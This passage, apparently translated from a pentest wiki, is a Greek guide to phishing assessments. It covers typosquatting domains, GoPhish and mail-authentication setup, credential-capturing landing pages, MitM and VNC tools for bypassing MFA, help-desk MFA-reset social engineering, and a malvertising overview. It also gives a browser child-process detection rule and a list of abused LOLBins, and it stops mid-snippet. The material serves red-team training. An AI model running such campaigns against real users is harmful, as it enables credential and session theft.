# Μεθοδολογία Phishing

{{#include ../../banners/hacktricks-training.md}}

## Μεθοδολογία

1. Κάντε reconnaissance στο θύμα
1. Επιλέξτε το **domain του θύματος**.
2. Εκτελέστε βασικό web enumeration **αναζητώντας login portals** που χρησιμοποιεί το θύμα και **αποφασίστε** ποιο θα **impersonate**.
3. Χρησιμοποιήστε **OSINT** για να **βρείτε emails**.
2. Προετοιμάστε το περιβάλλον
1. **Αγοράστε το domain** που πρόκειται να χρησιμοποιήσετε για το phishing assessment
2. **Ρυθμίστε τις σχετικές εγγραφές του email service** (SPF, DMARC, DKIM, rDNS)
3. Ρυθμίστε το VPS με **gophish**
3. Προετοιμάστε την campaign
1. Προετοιμάστε το **email template**
2. Προετοιμάστε τη **web page** για την κλοπή των credentials
4. Εκκινήστε την campaign!

## Δημιουργία παρόμοιων domain names ή αγορά trusted domain

### Τεχνικές παραλλαγής Domain Name

- **Keyword**: Το domain name **περιέχει ένα σημαντικό **keyword** του αρχικού domain (π.χ., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Αλλάξτε την **τελεία σε ενωτικό** ενός subdomain (π.χ., www-zelster.com).
- **New TLD**: Το ίδιο domain χρησιμοποιώντας ένα **new TLD** (π.χ., zelster.org)
- **Homoglyph**: **Αντικαθιστά** ένα γράμμα στο domain name με **γράμματα που μοιάζουν οπτικά** (π.χ., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Ανταλλάσσει δύο γράμματα** μέσα στο domain name (π.χ., zelsetr.com).
- **Singularization/Pluralization**: Προσθέτει ή αφαιρεί το “s” στο τέλος του domain name (π.χ., zeltsers.com).
- **Omission**: **Αφαιρεί ένα** από τα γράμματα του domain name (π.χ., zelser.com).
- **Repetition:** **Επαναλαμβάνει ένα** από τα γράμματα του domain name (π.χ., zeltsser.com).
- **Replacement**: Όπως το homoglyph, αλλά λιγότερο stealthy. Αντικαθιστά ένα από τα γράμματα του domain name, πιθανώς με ένα γράμμα που βρίσκεται κοντά στο αρχικό γράμμα του keyboard (π.χ., zektser.com).
- **Subdomained**: Εισάγει μια **τελεία** μέσα στο domain name (π.χ., ze.lster.com).
- **Insertion**: **Εισάγει ένα γράμμα** στο domain name (π.χ., zerltser.com).
- **Missing dot**: Προσθέτει το TLD στο domain name. (π.χ., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Υπάρχει **πιθανότητα κάποια από τα bits που είναι αποθηκευμένα ή βρίσκονται σε επικοινωνία να αντιστραφούν αυτόματα** λόγω διάφορων παραγόντων, όπως οι ηλιακές εκλάμψεις, οι κοσμικές ακτίνες ή σφάλματα hardware.

Όταν αυτή η έννοια **εφαρμόζεται σε DNS requests**, είναι πιθανό το **domain που λαμβάνει ο DNS server** να μην είναι το ίδιο με το domain που ζητήθηκε αρχικά.

Για παράδειγμα, μια τροποποίηση ενός bit στο domain "windows.com" μπορεί να το αλλάξει σε "windnws.com."

Οι Attackers μπορεί να **εκμεταλλευτούν αυτό το γεγονός καταχωρίζοντας πολλαπλά bit-flipping domains** που μοιάζουν με το domain του θύματος. Σκοπός τους είναι να ανακατευθύνουν legitimate users στη δική τους υποδομή.

Για περισσότερες πληροφορίες διαβάστε το [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Αγορά trusted domain

Μπορείτε να αναζητήσετε στο [https://www.expireddomains.net/](https://www.expireddomains.net) ένα expired domain που θα μπορούσατε να χρησιμοποιήσετε.\
Για να βεβαιωθείτε ότι το expired domain που πρόκειται να αγοράσετε **έχει ήδη καλό SEO**, μπορείτε να αναζητήσετε πώς κατηγοριοποιείται στα:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Εντοπισμός Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% δωρεάν)
- [https://phonebook.cz/](https://phonebook.cz) (100% δωρεάν)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Για να **εντοπίσετε περισσότερες** έγκυρες email addresses ή να **επαληθεύσετε όσες** έχετε ήδη εντοπίσει, μπορείτε να ελέγξετε αν μπορείτε να κάνετε brute-force στους SMTP servers του θύματος. [Μάθετε εδώ πώς να επαληθεύετε/εντοπίζετε email addresses](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Επιπλέον, μην ξεχνάτε ότι αν οι users χρησιμοποιούν **κάποιο web portal για να έχουν πρόσβαση στα mails τους**, μπορείτε να ελέγξετε αν είναι ευάλωτο σε **username brute force** και να εκμεταλλευτείτε την ευπάθεια, αν είναι δυνατό.

## Ρύθμιση του GoPhish

### Εγκατάσταση

Μπορείτε να το κατεβάσετε από το [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Κατεβάστε το και αποσυμπιέστε το μέσα στο `/opt/gophish` και εκτελέστε το `/opt/gophish/gophish`\
Θα σας δοθεί ένας κωδικός πρόσβασης για τον admin user στη θύρα 3333 στην έξοδο. Επομένως, αποκτήστε πρόσβαση σε αυτή τη θύρα και χρησιμοποιήστε αυτά τα credentials για να αλλάξετε τον κωδικό πρόσβασης του admin. Ίσως χρειαστεί να κάνετε tunnel αυτή τη θύρα προς το local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Ρύθμιση

**Ρύθμιση πιστοποιητικού TLS**

Πριν από αυτό το βήμα, θα πρέπει να έχετε **ήδη αγοράσει το domain** που πρόκειται να χρησιμοποιήσετε και αυτό πρέπει να **δείχνει** στη **διεύθυνση IP του VPS** όπου ρυθμίζετε το **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Διαμόρφωση Mail**

Ξεκινήστε την εγκατάσταση: `apt-get install postfix`

Στη συνέχεια, προσθέστε το domain στα ακόλουθα αρχεία:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Αλλάξτε επίσης** τις τιμές των ακόλουθων μεταβλητών μέσα στο /etc/postfix/main.cf

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Τέλος, τροποποιήστε τα αρχεία **`/etc/hostname`** και **`/etc/mailname`** ώστε να περιέχουν το όνομα του domain σας και **κάντε restart το VPS.**

Τώρα, δημιουργήστε ένα **DNS A record** για το `mail.<domain>` που να δείχνει στη **διεύθυνση IP** του VPS και ένα **DNS MX** record που να δείχνει στο `mail.<domain>`

Τώρα ας δοκιμάσουμε να στείλουμε ένα email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

Σταματήστε την εκτέλεση του gophish και ας το ρυθμίσουμε.\
Τροποποιήστε το `/opt/gophish/config.json` ως εξής (σημειώστε τη χρήση του https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Διαμόρφωση της υπηρεσίας gophish**

Για να δημιουργήσετε την υπηρεσία gophish, ώστε να μπορεί να εκκινείται αυτόματα και να διαχειρίζεται ως υπηρεσία, μπορείτε να δημιουργήσετε το αρχείο `/etc/init.d/gophish` με το ακόλουθο περιεχόμενο:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Ολοκληρώστε τη διαμόρφωση της υπηρεσίας και ελέγξτε την κάνοντας:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Διαμόρφωση mail server και domain

### Περιμένετε και να είστε legit

Όσο παλαιότερο είναι ένα domain, τόσο λιγότερο πιθανό είναι να επισημανθεί ως spam. Επομένως, πρέπει να περιμένετε όσο το δυνατόν περισσότερο (τουλάχιστον 1 εβδομάδα) πριν από το phishing assessment. Επιπλέον, αν δημιουργήσετε μια σελίδα σχετικά με έναν τομέα με καλή φήμη, η φήμη που θα αποκτηθεί θα είναι καλύτερη.

Σημειώστε ότι, ακόμη και αν πρέπει να περιμένετε μία εβδομάδα, μπορείτε να ολοκληρώσετε τώρα όλη τη διαμόρφωση.

### Διαμόρφωση εγγραφής Reverse DNS (rDNS)

Ορίστε μια εγγραφή rDNS (PTR), η οποία επιλύει τη διεύθυνση IP του VPS στο domain name.

### Εγγραφή Sender Policy Framework (SPF)

Πρέπει να **διαμορφώσετε μια εγγραφή SPF για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή SPF, [**διαβάστε αυτήν τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Μπορείτε να χρησιμοποιήσετε το [https://www.spfwizard.net/](https://www.spfwizard.net) για να δημιουργήσετε την SPF policy σας (χρησιμοποιήστε την IP του VPS machine).

![Φόρμα SPF Wizard για τη δημιουργία μιας εγγραφής SPF για ένα phishing domain](<../../images/image (1037).png>)

Αυτό είναι το περιεχόμενο που πρέπει να οριστεί μέσα σε μια εγγραφή TXT στο domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Έλεγχος ταυτότητας μηνυμάτων βάσει domain, αναφορά και συμμόρφωση (DMARC) Record

Πρέπει να **ρυθμίσετε ένα DMARC record για το νέο domain**. Αν δεν γνωρίζετε τι είναι ένα DMARC record, [**διαβάστε αυτήν τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Πρέπει να δημιουργήσετε ένα νέο DNS TXT record που να δείχνει στο hostname `_dmarc.<domain>` με το ακόλουθο περιεχόμενο:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Πρέπει να **διαμορφώσετε ένα DKIM για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή DKIM, [**διαβάστε αυτήν τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Αυτό το tutorial βασίζεται στο: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Πρέπει να συνενώσετε και τις δύο τιμές B64 που δημιουργεί το κλειδί DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Δοκιμάστε τη βαθμολογία της διαμόρφωσης του email σας

Μπορείτε να το κάνετε χρησιμοποιώντας το [https://www.mail-tester.com/](https://www.mail-tester.com)\
Απλώς ανοίξτε τη σελίδα και στείλτε ένα email στη διεύθυνση που σας δίνουν:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Μπορείτε επίσης να **ελέγξετε τη διαμόρφωση του email σας** στέλνοντας ένα email στη διεύθυνση `check-auth@verifier.port25.com` και **διαβάζοντας την απάντηση** (για αυτό θα χρειαστεί να **ανοίξετε** τη θύρα **25** και να δείτε την απάντηση στο αρχείο _/var/mail/root_, αν στείλετε το email ως root).\
Ελέγξτε ότι περνάτε όλες τις δοκιμές:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Μπορείτε επίσης να στείλετε **μήνυμα σε ένα Gmail υπό τον έλεγχό σας** και να ελέγξετε τις **κεφαλίδες του email** στα εισερχόμενα του Gmail· το `dkim=pass` θα πρέπει να υπάρχει στο πεδίο κεφαλίδας `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Αφαίρεση από τη Blacklist του Spamhaus

Η σελίδα [www.mail-tester.com](https://www.mail-tester.com) μπορεί να σας ενημερώσει αν το domain σας έχει αποκλειστεί από το Spamhaus. Μπορείτε να ζητήσετε την αφαίρεση του domain/IP σας στη διεύθυνση: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Αφαίρεση από τη Blacklist της Microsoft

​​Μπορείτε να ζητήσετε την αφαίρεση του domain/IP σας στη διεύθυνση [https://sender.office.com/](https://sender.office.com).

## Δημιουργία & Εκκίνηση Campaign GoPhish

### Προφίλ αποστολής

- Ορίστε κάποιο **όνομα για την αναγνώριση** του προφίλ αποστολέα
- Αποφασίστε από ποιον λογαριασμό θα στείλετε τα phishing emails. Προτάσεις: _noreply, support, servicedesk, salesforce..._
- Μπορείτε να αφήσετε κενά το username και το password, αλλά βεβαιωθείτε ότι έχετε επιλέξει το Ignore Certificate Errors

![Δημιουργία & Εκκίνηση Campaign GoPhish - Προφίλ αποστολής: Μπορείτε να αφήσετε κενά το username και το password, αλλά βεβαιωθείτε ότι έχετε επιλέξει το Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Συνιστάται να χρησιμοποιήσετε τη λειτουργία "**Send Test Email**" για να ελέγξετε ότι όλα λειτουργούν.\
> Θα συνιστούσα να **στείλετε τα δοκιμαστικά emails σε διευθύνσεις email 10min** ώστε να αποφύγετε την καταχώρισή σας σε blacklist κατά τη διάρκεια των δοκιμών.

### Πρότυπο email

- Ορίστε κάποιο **όνομα για την αναγνώριση** του προτύπου
- Στη συνέχεια γράψτε ένα **subject** (τίποτα ασυνήθιστο, απλώς κάτι που θα περιμένατε να διαβάσετε σε ένα κανονικό email)
- Βεβαιωθείτε ότι έχετε επιλέξει το "**Add Tracking Image**"
- Γράψτε το **πρότυπο email** (μπορείτε να χρησιμοποιήσετε μεταβλητές όπως στο ακόλουθο παράδειγμα):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Σημειώστε ότι **για να αυξηθεί η αξιοπιστία του email**, συνιστάται να χρησιμοποιήσετε κάποια υπογραφή από ένα email του πελάτη. Προτάσεις:

- Στείλτε ένα email σε μια **ανύπαρκτη διεύθυνση** και ελέγξτε αν η απάντηση περιέχει κάποια υπογραφή.
- Αναζητήστε **δημόσια emails**, όπως info@ex.com ή press@ex.com ή public@ex.com, στείλτε τους ένα email και περιμένετε την απάντηση.
- Προσπαθήστε να επικοινωνήσετε με κάποιο **έγκυρο email που εντοπίστηκε** και περιμένετε την απάντηση.

![Sending Profile - Email Template: Προσπαθήστε να επικοινωνήσετε με κάποιο έγκυρο email που εντοπίστηκε και περιμένετε την απάντηση](<../../images/image (80).png>)

> [!TIP]
> Το Email Template επιτρέπει επίσης την **επισύναψη αρχείων προς αποστολή**. Αν θέλετε επίσης να κλέψετε NTLM challenges χρησιμοποιώντας ειδικά διαμορφωμένα αρχεία/έγγραφα [διαβάστε αυτήν τη σελίδα](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Ορίστε ένα **όνομα**
- **Γράψτε τον HTML κώδικα** της ιστοσελίδας. Σημειώστε ότι μπορείτε να **εισαγάγετε** ιστοσελίδες.
- Επιλέξτε **Capture Submitted Data** και **Capture Passwords**
- Ορίστε μια **ανακατεύθυνση**

![Email Template - Landing Page: Επιλέξτε Capture Submitted Data και Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Συνήθως θα χρειαστεί να τροποποιήσετε τον HTML κώδικα της σελίδας και να πραγματοποιήσετε μερικές δοκιμές τοπικά (ίσως χρησιμοποιώντας κάποιον Apache server) **μέχρι να μείνετε ικανοποιημένοι με τα αποτελέσματα.** Στη συνέχεια, γράψτε αυτόν τον HTML κώδικα στο πλαίσιο.\
> Σημειώστε ότι, αν χρειάζεται να **χρησιμοποιήσετε στατικούς πόρους** για το HTML (ίσως κάποιες σελίδες CSS και JS), μπορείτε να τους αποθηκεύσετε στο _**/opt/gophish/static/endpoint**_ και στη συνέχεια να αποκτήσετε πρόσβαση σε αυτούς από το _**/static/\<filename>**_

> [!TIP]
> Για την ανακατεύθυνση, μπορείτε να **ανακατευθύνετε τους χρήστες στην κύρια νόμιμη ιστοσελίδα** του θύματος ή, για παράδειγμα, να τους ανακατευθύνετε στο _/static/migration.html_, να προσθέσετε έναν **περιστρεφόμενο τροχό (**[**https://loading.io/**](https://loading.io)**) για 5 δευτερόλεπτα και στη συνέχεια να υποδείξετε ότι η διαδικασία ολοκληρώθηκε με επιτυχία**.

### Users & Groups

- Ορίστε ένα όνομα
- **Εισαγάγετε τα δεδομένα** (σημειώστε ότι, για να χρησιμοποιήσετε το template του παραδείγματος, χρειάζεστε το firstname, το last name και τη διεύθυνση email κάθε χρήστη)

![Landing Page - Users & Groups: Εισαγάγετε τα δεδομένα (σημειώστε ότι, για να χρησιμοποιήσετε το template του παραδείγματος, χρειάζεστε το firstname, το last name και τη διεύθυνση email κάθε χρήστη)](<../../images/image (163).png>)

### Campaign

Τέλος, δημιουργήστε μια campaign επιλέγοντας ένα όνομα, το email template, τη landing page, το URL, το sending profile και το group. Σημειώστε ότι το URL θα είναι ο σύνδεσμος που θα σταλεί στα θύματα.

Σημειώστε ότι το **Sending Profile επιτρέπει την αποστολή ενός δοκιμαστικού email, ώστε να δείτε πώς θα φαίνεται το τελικό phishing email**:

![Users & Groups - Campaign: Σημειώστε ότι το Sending Profile επιτρέπει την αποστολή ενός δοκιμαστικού email, ώστε να δείτε πώς θα φαίνεται το τελικό phishing email](<../../images/image (192).png>)

Μόλις είναι όλα έτοιμα, απλώς εκκινήστε την campaign!

## Website Cloning

Αν, για οποιονδήποτε λόγο, θέλετε να κάνετε clone την ιστοσελίδα, ελέγξτε την ακόλουθη σελίδα:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Σε ορισμένα phishing assessments (κυρίως για Red Teams), θα θέλετε επίσης να **στείλετε αρχεία που περιέχουν κάποιου είδους backdoor** (ίσως ένα C2 ή ίσως απλώς κάτι που θα ενεργοποιήσει μια authentication).\
Δείτε την ακόλουθη σελίδα για ορισμένα παραδείγματα:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Η προηγούμενη επίθεση είναι αρκετά έξυπνη, καθώς προσποιείστε μια πραγματική ιστοσελίδα και συλλέγετε τις πληροφορίες που εισάγει ο χρήστης. Δυστυχώς, αν ο χρήστης δεν εισήγαγε τον σωστό κωδικό πρόσβασης ή αν η εφαρμογή που προσποιηθήκατε είναι ρυθμισμένη με 2FA, **αυτές οι πληροφορίες δεν θα σας επιτρέψουν να προσποιηθείτε ότι είστε ο χρήστης που εξαπατήθηκε**.

Σε αυτό το σημείο είναι χρήσιμα εργαλεία όπως τα [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** τα [**CredSniper**](https://github.com/ustayready/CredSniper) και το [**muraena**](https://github.com/muraenateam/muraena). Αυτό το εργαλείο θα σας επιτρέψει να δημιουργήσετε μια επίθεση τύπου MitM. Βασικά, οι επιθέσεις λειτουργούν ως εξής:

1. **Προσποιείστε τη φόρμα σύνδεσης** της πραγματικής ιστοσελίδας.
2. Ο χρήστης **στέλνει** τα **credentials** του στη fake σελίδα σας και το εργαλείο τα στέλνει στην πραγματική ιστοσελίδα, **ελέγχοντας αν τα credentials λειτουργούν**.
3. Αν ο λογαριασμός είναι ρυθμισμένος με **2FA**, η σελίδα MitM θα το ζητήσει και, μόλις το **εισαγάγει ο χρήστης**, το εργαλείο θα το στείλει στην πραγματική ιστοσελίδα.
4. Μόλις ο χρήστης πιστοποιηθεί, εσείς (ως attacker) θα έχετε **καταγράψει τα credentials, το 2FA, το cookie και κάθε πληροφορία** από κάθε αλληλεπίδραση που πραγματοποιεί ο χρήστης όσο το εργαλείο εκτελεί MitM.

### Via VNC

Τι θα γινόταν αν, αντί να **στείλετε το θύμα σε μια κακόβουλη σελίδα** με την ίδια εμφάνιση με την αρχική, το στέλνατε σε μια **VNC session με έναν browser συνδεδεμένο στην πραγματική ιστοσελίδα**; Θα μπορείτε να δείτε τι κάνει, να κλέψετε τον κωδικό πρόσβασης, το MFA που χρησιμοποιήθηκε, τα cookies...\
Μπορείτε να το κάνετε αυτό με το [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Προφανώς, ένας από τους καλύτερους τρόπους για να μάθετε αν σας έχουν εντοπίσει είναι να **αναζητήσετε το domain σας σε blacklists**. Αν εμφανίζεται καταχωρισμένο, αυτό σημαίνει ότι με κάποιον τρόπο το domain σας εντοπίστηκε ως ύποπτο.\
Ένας εύκολος τρόπος να ελέγξετε αν το domain σας εμφανίζεται σε κάποια blacklist είναι να χρησιμοποιήσετε το [https://malwareworld.com/](https://malwareworld.com)

Ωστόσο, υπάρχουν και άλλοι τρόποι για να μάθετε αν το θύμα **αναζητά ενεργά ύποπτη phishing δραστηριότητα στο διαδίκτυο**, όπως εξηγείται στο:


{{#ref}}
detecting-phising.md
{{#endref}}

Μπορείτε να **αγοράσετε ένα domain με όνομα πολύ παρόμοιο** με το domain του θύματος **και/ή να δημιουργήσετε ένα certificate** για ένα **subdomain** ενός domain που ελέγχετε, **περιέχοντας** το **keyword** του domain του θύματος. Αν το **θύμα** πραγματοποιήσει οποιουδήποτε είδους **DNS ή HTTP αλληλεπίδραση** με αυτά, θα γνωρίζετε ότι **αναζητά ενεργά** ύποπτα domains και θα χρειαστεί να είστε πολύ stealth.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Χρησιμοποιήστε το [**Phishious** ](https://github.com/Rices/Phishious)για να αξιολογήσετε αν το email σας θα καταλήξει στον φάκελο spam ή αν θα αποκλειστεί ή θα είναι επιτυχές.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Τα σύγχρονα intrusion sets παρακάμπτουν ολοένα και περισσότερο τα email lures και **στοχεύουν άμεσα τη ροή εργασίας του service-desk / identity-recovery**, για να παρακάμψουν το MFA. Η επίθεση είναι πλήρως "living-off-the-land": μόλις ο operator αποκτήσει έγκυρα credentials, μετακινείται χρησιμοποιώντας ενσωματωμένα admin εργαλεία – δεν απαιτείται malware.<sup>[[6]](#references)</sup>

### Attack flow
1. Κάντε recon στο θύμα
* Συλλέξτε προσωπικές και εταιρικές πληροφορίες από το LinkedIn, data breaches, δημόσια GitHub κ.λπ.
* Εντοπίστε identities υψηλής αξίας (στελέχη, IT, οικονομικό τμήμα) και καταγράψτε την **ακριβή διαδικασία του help-desk** για reset κωδικού πρόσβασης / MFA.
2. Social engineering σε πραγματικό χρόνο
* Καλέστε τηλεφωνικά, μέσω Teams ή μέσω chat το help-desk, προσποιούμενοι το target (συχνά με **spoofed caller-ID** ή **cloned voice**).
* Παρέχετε τα PII που συλλέξατε προηγουμένως, για να περάσετε την επαλήθευση βάσει γνώσεων.
* Πείστε τον agent να **κάνει reset το MFA secret** ή να πραγματοποιήσει **SIM-swap** σε καταχωρισμένο αριθμό κινητού.
3. Άμεσες ενέργειες μετά την πρόσβαση (≤60 min σε πραγματικές περιπτώσεις)
* Αποκτήστε foothold μέσω οποιουδήποτε web SSO portal.
* Κάντε enumerate το AD / AzureAD με built-ins (χωρίς να αποθέσετε binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Πραγματοποιήστε lateral movement με **WMI**, **PsExec** ή νόμιμους **RMM** agents που είναι ήδη whitelisted στο περιβάλλον.

### Detection & Mitigation
* Αντιμετωπίστε το identity recovery μέσω help-desk ως **privileged operation** – απαιτήστε step-up auth και έγκριση manager.
* Αναπτύξτε κανόνες **Identity Threat Detection & Response (ITDR)** / **UEBA** που δημιουργούν alert για:
* Αλλαγή MFA method + authentication από νέα συσκευή / γεωγραφική τοποθεσία.
* Άμεση ανύψωση δικαιωμάτων του ίδιου principal (user-→-admin).
* Καταγράφετε τις κλήσεις στο help-desk και επιβάλετε **call-back σε ήδη καταχωρισμένο αριθμό** πριν από οποιοδήποτε reset.
* Υλοποιήστε **Just-In-Time (JIT) / Privileged Access**, ώστε οι λογαριασμοί μετά από reset να μην κληρονομούν αυτόματα tokens υψηλών δικαιωμάτων.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews αντισταθμίζουν το κόστος των high-touch επιχειρήσεων με μαζικές επιθέσεις που μετατρέπουν τις **μηχανές αναζήτησης και τα ad networks στο κανάλι παράδοσης**.<sup>[[6]](#references)</sup>

1. Το **SEO poisoning / malvertising** προωθεί ένα fake αποτέλεσμα, όπως το `chromium-update[.]site`, στην κορυφή των search ads.
2. Το θύμα κατεβάζει έναν μικρό **first-stage loader** (συχνά JS/HTA/ISO). Παραδείγματα που παρατηρήθηκαν από τη Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Ο loader εξάγει browser cookies και credential DBs και στη συνέχεια κατεβάζει έναν **silent loader**, ο οποίος αποφασίζει – *σε πραγματικό χρόνο* – αν θα αναπτύξει:
* RAT (π.χ. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Αποκλείστε domains που καταχωρίστηκαν πρόσφατα και επιβάλετε **Advanced DNS / URL Filtering** και στα *search-ads* και στα email.
* Περιορίστε την εγκατάσταση λογισμικού σε signed MSI / Store packages και αρνηθείτε την εκτέλεση `HTA`, `ISO`, `VBS` μέσω policy.
* Παρακολουθείτε child processes των browsers που ανοίγουν installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Αναζητήστε LOLBins που καταχρώνται συχνά οι first-stage loaders (π.χ. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Ορισμένα fake software portals διατηρούν το ορατό download `href` να δείχνει στο **πραγματικό GitHub/release URL**, αλλά κάνουν hijack την **πρώτη** αλληλεπίδραση του χρήστη μέσω JavaScript και στέλνουν αντ' αυτού το θύμα σε μια αλυσίδα **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
